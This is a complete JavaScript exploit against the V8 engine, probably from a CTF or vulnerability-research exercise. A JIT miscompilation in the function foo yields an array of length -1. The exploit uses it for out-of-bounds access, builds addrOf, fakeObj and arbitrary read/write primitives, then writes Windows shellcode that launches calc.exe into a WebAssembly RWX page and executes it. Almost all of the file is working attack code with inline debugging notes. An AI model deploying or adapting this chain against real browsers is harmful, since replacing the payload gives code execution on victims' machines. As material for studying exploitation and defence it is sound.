function main() {
    var bs = new ArrayBuffer(8);
    var fs = new Float64Array(bs);
    var is = new BigUint64Array(bs);
    var us = new Uint32Array(bs);
    
    function log(_string) {
        print(_string)
    }
    
    function ftoi(val) {
        fs[0] = val;
        return is[0];
    }
    
    function myftoi(val) {
        fs[0] = val;
        return [us[0], us[1]];
    }
    
    function myitof(lower, upper) {
        us[0] = lower;
        us[1] = upper;
        return fs[0];
    }
    
    function itof(val) {
        is[0] = val;
        return fs[0];
    }
    
    function hex(_val) {
        return "0x"+_val.toString(16)
    }
    
    function foo(x) {
        let y = 0x7fffffff;
        if (x == NaN) y = NaN;
        if (x) y = -1;
        let z = y + 1;
        z >>= 31;
        z = Math.sign(z | 1);
        z = 0x7fffffff + 1 - z;
        let i = x ? 0 : z;
        i = 0 - Math.sign(i);
        let a = new Array(i);
        a.shift();
        let b = [1.1, 2.2, 3.3];
        return [a, b];
    }
    
    for (let i = 0; i < 100000; i++) foo(true);
    let [minus_1_arr, oob] = foo(false);
    log("[*] Created 2 arrays: 1 array of length -1 and 1 array of length 3")
    log("[*] The array of length 3 is the oob array which is not corrupted yet")
    log("[*] We will use the -1 length array to corrupt the oob array")
    
    // SMI array
    //let arr_map = arr[1]; // map
    //let arr_properties = arr[2]; // properties
    //let arr_elements = arr[3]; // elements
    //let arr_length = arr[4]; // length
    // Double Array
    //let oob_map = arr[13]; // map
    //let oob_properties = arr[14]; // properties
    //let oob_elements = arr[15]; // elements
    //let oob_length = arr[16]; // length
    //let oob_index_0 = arr[7-8]; 
    //let oob_index_1 = arr[9-10]; 
    //let oob_index_2 = arr[11-12]; 
    function addrOf(k) {
        minus_1_arr[7] = k;
        return ftoi(oob[0]) & 0xffffffffn;
    }
    // let test = [];
    // %DebugPrint(test);
    // print(hex(addrOf(test)));
    // print("==============");
    // let test_addr_number = addrOf(test);
    // ftoi(oob[0]) returns 0x3ff199990832ba01 where 0832ba01 is the address of test 
    
    function fakeObj(k) {
        oob[0] = itof(k);
        return minus_1_arr[7];
    }
    // let should_be_test = fakeObj(test_addr_number);
    // %DebugPrint(should_be_test);
    // print("==============");
    
    minus_1_arr[16] = 100;
    log("[*] Increasing the length of the oob array to 100 get oob r/w")
    log(`[*] Sanity check: OOB array length: ${oob.length}`)
    
    let float_array = [1.11,1.12,1.13,1.14];
    let objec       = {a:1.21}
    let objec_array = [objec,objec,objec,objec];
    let arbuf       = new ArrayBuffer(0x1024);
    let arbuf_wrap  = new Uint32Array(arbuf);
    let arbuf_array = [arbuf,arbuf,arbuf,arbuf];
    //%DebugPrint(float_array);
    //%DebugPrint(objec_array);
    //%DebugPrint(arbuf);
    
    for (let i = 0; i < 100; i++) {
        if (1===2) print(i + " - " + hex(ftoi(oob[i])));
    }
    
    let FLOAT_ELEMENT_INDEX_UPPER = 35
    let OBJEC_ELEMENT_INDEX_UPPER = 53
    
    function read64_compressed_only_need_bottom_32bits(_address) {
        let [lower, upper] = myftoi(oob[FLOAT_ELEMENT_INDEX_UPPER]);
        oob[FLOAT_ELEMENT_INDEX_UPPER] = myitof(lower, Number(_address)-0x8) 
        // account for the fact that there is a 8 byte offset from the element pointer to the index 0 of the first element
        return ftoi(float_array[0])
    }
    
    function writ64_compressed_only_need_bottom_32bits(_address, _lower, _upper) {
        let [lower, upper] = myftoi(oob[FLOAT_ELEMENT_INDEX_UPPER]);
        oob[FLOAT_ELEMENT_INDEX_UPPER] = myitof(lower, Number(_address)-0x8) 
        // account for the fact that there is a 8 byte offset from the element pointer to the index 0 of the first element
        float_array[0] = myitof(_lower, _upper);
    }
    
    //let testArray = []
    //let testArrayAddress = addrOf(testArray);
    //%DebugPrint(testArray);
    //print(hex(testArrayAddress))
    //print(hex(read64_compressed_only_need_bottom_32bits(testArrayAddress)));
    
    let ab = new ArrayBuffer(0x1024);
    let abu8 = new Uint8Array(ab);
    let ab32 = new Uint32Array(ab);
    let calc_shellcode = new Uint8Array(
        [   
            0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
            0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,
            0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
            0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,
            0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,
            0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
            0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48,
            0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1,
            0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
            0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,
            0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A,
            0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
            0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B,
            0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
            0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,
            0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E,
            0x65, 0x78, 0x65, 0x00, 0x90, 0x90, 0x90, 0x90
        ]
    );
    var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
    var wasmModule = new WebAssembly.Module(wasmCode);
    var wasmInstance = new WebAssembly.Instance(wasmModule);
    var func = wasmInstance.exports.main;
    
    // set the backing store of the ab to the pointer to the rwx region
    var ab_backing_store = read64_compressed_only_need_bottom_32bits(addrOf(ab)+0x58n);
    var rwx = read64_compressed_only_need_bottom_32bits(addrOf(wasmInstance)+0x68n);
    var rwx_f = itof(rwx);
    var [rwx_l, rwx_u] = myftoi(rwx_f)
    writ64_compressed_only_need_bottom_32bits(addrOf(ab)+0x58n, Number(rwx_l), Number(rwx_u));
    abu8.set(calc_shellcode);
    func();
    
    /*
    69 - 0x93a9a2a000000000
    70 - 0x1b4
    */
    let BACKING_STORE_INDEX_1 = 69
    let BACKING_STORE_INDEX_2 = 70
    
    function read64(address) {
        let [ _lower,  _upper] = myftoi(oob[BACKING_STORE_INDEX_1])
        let [__lower, __upper] = myftoi(oob[BACKING_STORE_INDEX_2])
        let address_f          = itof(address)
        let [address_l, address_u] = myftoi(address_f)
        oob[BACKING_STORE_INDEX_1] = myitof(_lower, address_l)
        oob[BACKING_STORE_INDEX_2] = myitof(address_u, __upper)
        return ftoi(myitof(Number(arbuf_wrap[0]), Number(arbuf_wrap[1])))
    }
    
    function writ64(address, input_l, input_u) {
        let [ _lower,  _upper] = myftoi(oob[BACKING_STORE_INDEX_1])
        let [__lower, __upper] = myftoi(oob[BACKING_STORE_INDEX_2])
        let address_f          = itof(address)
        let [address_l, address_u] = myftoi(address_f)
        oob[BACKING_STORE_INDEX_1] = myitof(_lower, address_l)
        oob[BACKING_STORE_INDEX_2] = myitof(address_u, __upper)
        arbuf_wrap[0] = input_l;
        arbuf_wrap[1] = input_u;
    }

    //var testArrayAgain = new ArrayBuffer(0x1024);
    //var testArrayAgainU = new Uint32Array(testArrayAgain);
    //testArrayAgainU[0] = 0x41414141
    //testArrayAgainU[1] = 0x42424242
    //let testArrayAgainBackingStore = read64_compressed_only_need_bottom_32bits(addrOf(testArrayAgain)+0x58n);
    //%DebugPrint(testArrayAgain);
    //print(hex(testArrayAgainBackingStore))
    //print(hex(read64(testArrayAgainBackingStore)))
    //writ64(testArrayAgainBackingStore, 0x43434343, 0xcafebabe)
    //print(hex(read64(testArrayAgainBackingStore)))
}

main()

//var map_and_properties = ftoi(oob[3]); // this is the map_and_properties values of the oob array
//var worker_cor = [itof(map_and_properties), 1.2, 2.3, 3.4];